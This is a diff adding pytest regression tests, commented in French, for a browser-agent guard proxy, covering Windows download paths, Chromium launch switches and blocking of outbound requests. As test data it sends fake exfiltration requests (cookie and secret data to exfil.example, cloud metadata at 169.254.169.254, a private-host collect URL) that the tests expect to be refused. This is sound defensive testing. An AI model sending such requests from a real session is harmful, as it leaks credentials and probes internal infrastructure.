@@ -266,3 +266,134 @@ def test_account_read_cuts_existing_public_tunnels(echo):
         public.close()
         account.close()
     assert "https://public.test/" in proxy.blocked
+
+
+# --- régressions Windows (validation native PR #109) ------------------------------------------------
+# Exécutées sur tous les systèmes : aucune dépendance à un faux binaire POSIX.
+
+def _argv_session(monkeypatch, tmp_path, **kwargs) -> agent_browser.Session:
+    monkeypatch.setattr(agent_browser, "require_backend", lambda: ("agent-browser-win32-x64.exe", "chrome.exe"))
+    monkeypatch.setattr(agent_browser, "_socket_root", lambda: str(tmp_path))
+    return agent_browser.Session("oct-t9", proxy_url="http://127.0.0.1:5555", **kwargs)
+
+
+def test_download_directory_given_to_chromium_is_never_verbatim(monkeypatch, tmp_path):
+    """agent-browser#1659 : Chrome annule tout téléchargement vers `\\\\?\\C:\\...` ou `C:/...`."""
+    import ntpath
+    monkeypatch.setattr(agent_browser.os, "path", ntpath)
+    assert agent_browser.plain_path("\\\\?\\C:\\Users\\me\\data\\inbox\\t2") == "C:\\Users\\me\\data\\inbox\\t2"
+    assert agent_browser.plain_path("\\\\?\\UNC\\srv\\share\\inbox") == "\\\\srv\\share\\inbox"
+    assert agent_browser.plain_path("C:/Users/me/inbox") == "C:\\Users\\me\\inbox"
+    monkeypatch.undo()
+    session = _argv_session(monkeypatch, tmp_path, download_dir=tmp_path / "inbox" / "t2")
+    args = session._global_args()
+    given = args[args.index("--download-path") + 1]
+    assert not given.startswith("\\\\?\\") and os.path.isabs(given)
+    assert os.path.normcase(given) == os.path.normcase(os.path.abspath(tmp_path / "inbox" / "t2"))
+
+
+def test_containment_check_accepts_verbatim_and_resolved_forms(tmp_path):
+    from octopus import browser_workspace as bw
+    inbox = tmp_path / "inbox" / "t2"
+    inbox.mkdir(parents=True)
+    (inbox / "DV-1001.txt").write_text("x", encoding="utf-8")
+    assert bw._within(inbox / "DV-1001.txt", inbox)
+    assert bw._within(Path(str(inbox.resolve())) / "DV-1001.txt", Path(os.path.relpath(inbox)))
+    assert not bw._within(tmp_path / "DV-1001.txt", inbox)
+    assert not bw._within(inbox / ".." / "DV-1001.txt", inbox)
+    if os.name == "nt":  # forme renvoyée par agent-browser sous Windows
+        assert bw._within(Path("\\\\?\\" + str((inbox / "DV-1001.txt").resolve())), inbox)
+
+
+def test_launch_switches_cut_browser_services_and_refuse_split_arguments(monkeypatch, tmp_path):
+    session = _argv_session(monkeypatch, tmp_path)
+    args = session._global_args()
+    launch = args[args.index("--args") + 1].split(",")
+    assert launch[:len(agent_browser._GUARD_ARGS)] == list(agent_browser._GUARD_ARGS)
+    for switch in ("--disable-background-networking", "--disable-field-trial-config", "--disable-breakpad",
+                   "--disable-client-side-phishing-detection", "--disable-domain-reliability", "--no-pings"):
+        assert switch in launch
+    assert not any(a.startswith("--disable-features") for a in launch)  # écraserait celui d'agent-browser
+    assert agent_browser.launch_args_ok(launch)
+    bad = _argv_session(monkeypatch, tmp_path, extra_args=("--disable-features=A,B",))
+    with pytest.raises(ValueError, match="virgule"):
+        bad._global_args()
+
+
+def test_browser_service_endpoints_are_refused_before_any_connection():
+    proxy = web_guard.GuardProxy(lambda url: True)  # même un garde qui autorise tout le public
+    connects = []
+    proxy._connect = lambda host, port: connects.append((host, port))
+    with proxy:
+        for target in ("optimizationguide-pa.googleapis.com:443", "content-autofill.googleapis.com:443",
+                       "update.googleapis.com:443", "safebrowsingohttpgateway.googleapis.com:443",
+                       "edgedl.me.gvt1.com:443", "clients2.google.com:443"):
+            assert _request(proxy, f"CONNECT {target} HTTP/1.1\r\n\r\n".encode()).startswith(b"HTTP/1.1 403")
+        assert _request(proxy, b"GET http://redirector.gvt1.com/edgedl/x HTTP/1.1\r\n\r\n").startswith(
+            b"HTTP/1.1 403")
+    assert connects == [] and proxy.allowed_urls == [] and proxy.blocked == []
+    assert len(proxy.browser_internal) == 7
+    for page_resource in ("https://fonts.googleapis.com/css", "https://www.google.com/", "https://www.gstatic.com/x"):
+        assert not web_guard.browser_service(page_resource)
+
+
+def _workspace_proxy(lab_origin: str):
+    """Le vrai garde de l'espace de travail derrière le vrai proxy (sans navigateur)."""
+    from octopus import browser_workspace as bw
+    space = bw.Workspace(bw.Scope("guard", "octopus", None), web_guard.BrowseState())
+    space.lab = {bw._origin(lab_origin)}
+    proxy = web_guard.GuardProxy(space._guard, allow_private=space._allow_private)
+    connects = []
+    real_connect = proxy._connect
+    proxy._connect = lambda host, port: connects.append((host, port)) or real_connect(host, port)
+    return space, proxy, connects
+
+
+def test_workspace_guard_blocks_metadata_and_private_hosts_before_any_connection(upstream):
+    lab = f"http://127.0.0.1:{upstream}"
+    space, proxy, connects = _workspace_proxy(lab)
+    with proxy:
+        for raw in (b"GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n\r\n",
+                    b"CONNECT 169.254.169.254:443 HTTP/1.1\r\n\r\n",
+                    b"GET http://10.0.0.1/collect?d=Offre HTTP/1.1\r\n\r\n",
+                    b"CONNECT 10.0.0.1:443 HTTP/1.1\r\n\r\n"):
+            assert _request(proxy, raw).startswith(b"HTTP/1.1 403"), raw
+        assert connects == []  # refus avant toute connexion amont
+        ok = _request(proxy, f"GET {lab}/page HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
+    assert ok.split(b"\r\n")[0].endswith(b"200 OK") and connects == [("127.0.0.1", upstream)]
+    assert proxy.blocked == ["http://169.254.169.254/latest/meta-data/", "https://169.254.169.254/",
+                             "http://10.0.0.1/collect?d=Offre", "https://10.0.0.1/"]
+    assert proxy.allowed_urls == [f"{lab}/page"]
+
+
+def test_authenticated_session_data_cannot_leave_to_a_public_domain(upstream, echo, monkeypatch):
+    """Après lecture d'un compte (taint), aucune destination publique ni le laboratoire n'est
+    contacté ; une connexion publique déjà ouverte est coupée avant le moindre octet."""
+    import ipaddress
+    monkeypatch.setattr(web_guard, "_resolved_ips", lambda host: [ipaddress.ip_address(  # pas de DNS réel
+        "127.0.0.1" if host == "127.0.0.1" else "93.184.216.34")])
+    lab = f"http://127.0.0.1:{upstream}"
+    space, proxy, connects = _workspace_proxy(lab)
+    proxy._connect = lambda host, port: connects.append((host, port)) or socket.create_connection(
+        ("127.0.0.1", echo))
+    with proxy:
+        port = int(proxy.url.rsplit(":", 1)[1])
+        public = socket.create_connection(("127.0.0.1", port), timeout=5)
+        public.sendall(b"CONNECT exfil.example:443 HTTP/1.1\r\n\r\n")
+        assert public.recv(1024).startswith(b"HTTP/1.1 200")
+        space.state.account_read = True  # la session a lu un compte connecté
+        proxy.revalidate()
+        try:
+            public.sendall(b"cookie=secret")
+            leaked = public.recv(1024)
+        except OSError:
+            leaked = b""
+        assert leaked == b""
+        before = len(connects)
+        for raw in (b"CONNECT exfil.example:443 HTTP/1.1\r\n\r\n",
+                    b"GET http://exfil.example/?d=secret HTTP/1.1\r\n\r\n",
+                    f"GET {lab}/ HTTP/1.1\r\n\r\n".encode()):
+            assert _request(proxy, raw).startswith(b"HTTP/1.1 403"), raw
+        assert len(connects) == before  # aucune nouvelle connexion amont
+        public.close()
+    assert "https://exfil.example/" in proxy.blocked and "http://exfil.example/?d=secret" in proxy.blocked
